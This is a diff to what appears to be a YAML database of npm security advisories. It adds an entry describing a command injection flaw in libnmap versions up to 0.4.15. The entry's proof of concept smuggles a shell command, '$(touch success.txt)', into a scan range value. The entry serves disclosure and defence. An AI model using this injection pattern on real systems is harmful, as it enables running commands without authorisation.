@@ -1,5 +1,25 @@
 ---
-- id: snykio:npm:libnmap:CVE-2018-16461
+- id: npmjs:npm:libnmap:719
+  title: Command Injection
+  description: "Versions of `libnmap` before 0.4.16 are vulnerable to command injection.
+    \n\nProof of concept\n\n```\nconst nmap = require('libnmap');\nconst opts = {\n
+    \   range: [\n        'scanme.nmap.org',\n        \"x.x.$(touch success.txt)\"\n
+    \   ]\n};\nnmap.scan(opts, function(err, report) {\n    if (err) throw new Error(err);\n\n
+    \   for (let item in report) {\n        console.log(JSON.stringify(report[item]));\n
+    \   }\n});\n```"
+  affected_package: libnmap
+  vulnerable_versions:
+  - "<=0.4.15"
+  severity: moderate
+  package_manager: npm
+  cwe: CWE-78
+  disclosed_date: 1970-01-01
+  created_date: 1970-01-01
+  last_modified_date: 1970-01-01
+  credit: Cristian-Alexandru Staicu
+  references: https://npmjs.com/advisories/719
+  source_url: https://npmjs.com/advisories/719
+- id: snykio:npm:libnmap:72551
   title: Arbitrary Command Injection
   description: |
     [libnmap][1] is an API to access nmap from node.js.
